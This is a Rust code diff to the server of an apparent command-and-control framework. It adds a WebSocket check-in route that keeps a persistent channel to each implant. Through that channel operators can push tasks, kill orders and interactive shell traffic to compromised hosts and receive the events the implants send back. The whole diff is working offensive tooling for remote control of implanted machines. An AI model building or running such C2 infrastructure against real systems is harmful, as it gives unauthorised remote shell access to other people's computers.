@@ -47,6 +47,7 @@ pub fn router(psk: Arc<Vec<u8>>) -> Router<Repository> {
         .route("/c2/register", post(register))
         .route("/c2/poll", post(poll))
         .route("/c2/checkin", post(checkin))
+        .route("/c2/ws", get(checkin_ws))
         .layer(Extension(psk))
 }
 
@@ -425,6 +426,158 @@ async fn checkin(
     .map_err(|error| error.status())
 }
 
+/// WebSocket check-in: the same sealed-envelope protocol as `/c2/checkin`, on
+/// a socket the implant keeps open between beacons.
+///
+/// The difference from the request/response carriers is what this route can do
+/// while nothing is being asked of the implant: the socket is registered as
+/// that session's live channel, so the portal can push a kill, a task or shell
+/// traffic at any moment, and it reads frames the implant sends on its own.
+async fn checkin_ws(
+    State(repo): State<Repository>,
+    Extension(psk): Extension<Arc<Vec<u8>>>,
+    Extension(live): Extension<crate::c2_live::LiveRegistry>,
+    Extension(hub): Extension<crate::shell_hub::ShellHub>,
+    store: Option<Extension<crate::callback_workspace::transfers::TransferStore>>,
+    ws: axum::extract::ws::WebSocketUpgrade,
+) -> Result<axum::response::Response, StatusCode> {
+    use axum::extract::ws::Message;
+
+    let store = store.map(|Extension(store)| store);
+    let repo = repo.clone();
+    let psk = psk.clone();
+    let live = live.clone();
+    let hub = hub.clone();
+    Ok(ws
+        .on_upgrade(move |mut socket| async move {
+            // Outbound frames for this socket: beacon replies and live pushes.
+            // The socket stays in this task, so a write from anywhere else goes
+            // into the queue and wakes this task, which then drains it.
+            let (writer, mut queue) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
+            let pending = Arc::new(tokio::sync::Notify::new());
+            let sink = crate::c2_live::LiveSink::new(writer.clone(), Arc::clone(&pending));
+            // The session this socket belongs to, learned from its first frame.
+            let mut attached: Option<crate::c2_live::LiveConnection> = None;
+
+            loop {
+                let frame = tokio::select! {
+                    // A beacon or a live event from the implant.
+                    frame = socket.recv() => match frame {
+                        Some(Ok(Message::Binary(wire))) => Inbound::FromImplant(wire.to_vec()),
+                        // Text and control frames carry nothing the protocol uses.
+                        Some(Ok(_)) => continue,
+                        Some(Err(_)) | None => break,
+                    },
+                    // The portal, or another operator's action, wrote to us.
+                    () = pending.notified() => Inbound::FromServer,
+                };
+                match frame {
+                    Inbound::FromServer => {
+                        // `queue` lives and dies with this task: when the socket
+                        // goes, the receiver drops and every later push reports
+                        // that there is no live connection.
+                        while let Ok(frame) = queue.try_recv() {
+                            if socket.send(Message::Binary(frame.into())).await.is_err() {
+                                break;
+                            }
+                        }
+                    }
+                    Inbound::FromImplant(wire) => {
+                        // Learn the session from the cleartext routing id.
+                        let routing = std::str::from_utf8(&wire)
+                            .ok()
+                            .and_then(Envelope::routing_id);
+                        if let Some(session_id) = routing {
+                            attach(&live, &mut attached, session_id, &sink);
+                        }
+                        let reply = match handle_inbound(&repo, &psk, &wire, store.as_ref()).await {
+                            InboundFrame::Reply(reply) => Some(reply),
+                            // An unsolicited event: the implant pushed it.
+                            InboundFrame::Event { session_id, event } => {
+                                match &event {
+                                    nw_profile::msgs::LiveEvent::Killed { task_id, killed } => {
+                                        // The callback confirming the stop is the
+                                        // end of the story an operator started
+                                        // with "stop this now".
+                                        if let Err(error) = repo
+                                            .confirm_task_kill(
+                                                &session_id.to_string(),
+                                                &task_id.to_string(),
+                                                *killed,
+                                            )
+                                            .await
+                                        {
+                                            tracing::warn!(%error, "kill confirmation not recorded");
+                                        }
+                                    }
+                                    other => {
+                                        hub.record(
+                                            &session_id.to_string(),
+                                            &crate::shell_hub::ImplantEvent::from(other.clone()),
+                                        );
+                                    }
+                                }
+                                None
+                            }
+                            // A frame that is neither; the peer may carry on.
+                            InboundFrame::Ignored => None,
+                        };
+                        if let Some(reply) = reply {
+                            // The registration handshake carries no session id
+                            // of its own; the acknowledgement names it in the
+                            // clear, and that is the first moment this socket can
+                            // be pushed to.
+                            if attached.is_none()
+                                && let Some(session_id) = std::str::from_utf8(&reply)
+                                    .ok()
+                                    .and_then(Envelope::routing_id)
+                            {
+                                attach(&live, &mut attached, session_id, &sink);
+                            }
+                            if socket.send(Message::Binary(reply.into())).await.is_err() {
+                                break;
+                            }
+                        }
+                    }
+                }
+            }
+
+            if let Some(connection) = attached {
+                live.detach(&connection);
+            }
+        })
+        .into_response())
+}
+
+/// Register this socket as the live channel for `session_id`.
+///
+/// A socket that reconnects under a new session (or a new socket for the same
+/// one) replaces the old registration, so pushes always go to the socket that
+/// is actually carrying this session.
+fn attach(
+    live: &crate::c2_live::LiveRegistry,
+    attached: &mut Option<crate::c2_live::LiveConnection>,
+    session_id: Uuid,
+    sink: &crate::c2_live::LiveSink,
+) {
+    if attached
+        .as_ref()
+        .is_some_and(|connection| connection.session_id == session_id)
+    {
+        return;
+    }
+    if let Some(previous) = attached.take() {
+        live.detach(&previous);
+    }
+    *attached = Some(live.attach(session_id, sink.clone()));
+}
+
+/// Which side of the socket produced the thing the loop is looking at.
+enum Inbound {
+    FromImplant(Vec<u8>),
+    FromServer,
+}
+
 async fn register(
     State(repo): State<Repository>,
     Extension(psk): Extension<Arc<Vec<u8>>>,
@@ -554,6 +707,56 @@ async fn poll(
         Some(sid),
         out,
     )))
+}
+
+/// What one frame the implant sent over a live socket turned out to be.
+enum InboundFrame {
+    /// A normal beacon: the client is waiting for this reply.
+    Reply(Vec<u8>),
+    /// Something the implant volunteered (shell output, a kill confirmation).
+    Event {
+        session_id: Uuid,
+        event: nw_profile::msgs::LiveEvent,
+    },
+    /// Neither; the peer may carry on.
+    Ignored,
+}
+
+/// Classify and handle one frame from a live socket.
+///
+/// The frame is opened first: an unsolicited `Kind::Event` is delivered to the
+/// shell hub, and anything else is handled exactly as `/c2/checkin` would.
+async fn handle_inbound(
+    repo: &Repository,
+    psk: &[u8],
+    wire: &[u8],
+    store: Option<&crate::callback_workspace::transfers::TransferStore>,
+) -> InboundFrame {
+    let Ok(text) = std::str::from_utf8(wire) else {
+        return InboundFrame::Ignored;
+    };
+    let Some(session_id) = Envelope::routing_id(text) else {
+        return match process_sealed_with_store(repo, psk, wire, "ws", store).await {
+            Ok(reply) => InboundFrame::Reply(reply),
+            Err(_) => InboundFrame::Ignored,
+        };
+    };
+    let Ok(encoded) = repo.session_key_for(&session_id.to_string()).await else {
+        return InboundFrame::Ignored;
+    };
+    let Some(encoded) = encoded else {
+        return InboundFrame::Ignored;
+    };
+    let Ok(key) = deb64(&encoded) else {
+        return InboundFrame::Ignored;
+    };
+    if let Some(event) = crate::c2_live::open_event(&key, session_id, wire) {
+        return InboundFrame::Event { session_id, event };
+    }
+    match process_sealed_with_store(repo, psk, wire, "ws", store).await {
+        Ok(reply) => InboundFrame::Reply(reply),
+        Err(_) => InboundFrame::Ignored,
+    }
 }
 
 /// Web UI routes for C2 task management. Requires authentication.
@@ -1710,6 +1913,8 @@ mod tests {
                 file_browser: true,
                 file_transfer: true,
                 task_ack: true,
+                live_channel: true,
+                interactive_shell: true,
             }),
             session_key: b64(&implant_kp.public_key()),
         };
